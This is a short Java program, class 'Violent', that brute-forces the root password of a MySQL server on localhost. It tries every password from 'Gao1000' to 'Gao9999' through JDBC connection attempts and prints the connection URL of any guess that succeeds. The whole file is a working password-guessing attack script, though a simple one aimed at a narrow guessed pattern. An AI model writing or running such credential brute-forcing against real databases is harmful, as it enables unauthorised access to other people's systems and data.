import java.sql.*;

public class Violent {
	public static void main(String[] args) throws Exception {
		// DriverManager.registerDriver(new com.mysql.jdbc.Driver());
		Class.forName("com.mysql.jdbc.Driver");
		String url = "jdbc:mysql://localhost?user=root&password=";
		for(int i = 1000;i <= 9999;i++) {
			String pas="Gao"+i;
			String testPasd = url+pas;
			try{
				Connection conn = DriverManager.getConnection(testPasd+"&useSSL=false");
			}
			catch(SQLException e) {continue;}
			System.out.println(testPasd);

		}
	}	
}
